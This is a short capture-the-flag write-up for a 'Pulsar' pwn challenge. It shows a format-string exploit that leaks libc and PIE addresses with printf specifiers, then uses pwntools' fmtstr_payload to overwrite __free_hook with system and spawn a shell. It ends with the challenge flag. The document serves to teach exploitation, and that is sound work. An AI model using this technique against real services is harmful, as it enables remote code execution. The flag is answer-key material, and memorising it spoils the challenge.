---
title: "Pulsar — Format String to Arbitrary Write"
ctf: "DefCon Quals 2025"
category: "pwn"
difficulty: "medium"
points: 350
date: "2026-02-14"
lat: 35.68
lng: 139.69
summary: "From a single uncontrolled `printf` we leak PIE and libc, then hijack `__free_hook` to win."
tags: ["fmtstr", "libc", "hooks"]
---

## The Bug

```c
printf(user_input);  // ouch
```

## Stage 1 — Leak

Dumping the stack with `%p.%p.%p...` reveals a libc address at offset 17 and a PIE address at offset 21.

```python
io.sendline(b"%17$p|%21$p")
libc_leak, pie_leak = io.recvline().split(b"|")
libc.address = int(libc_leak, 16) - libc.sym.__libc_start_main - 243
```

## Stage 2 — Arbitrary Write

Using `%n` to write `system` over `__free_hook`.

```python
payload = fmtstr_payload(8, {libc.sym.__free_hook: libc.sym.system})
io.sendline(payload)
io.sendline(b"/bin/sh\x00")
```

**Flag:** `DEFCON{p3rcent_n_n3v3r_di3s}`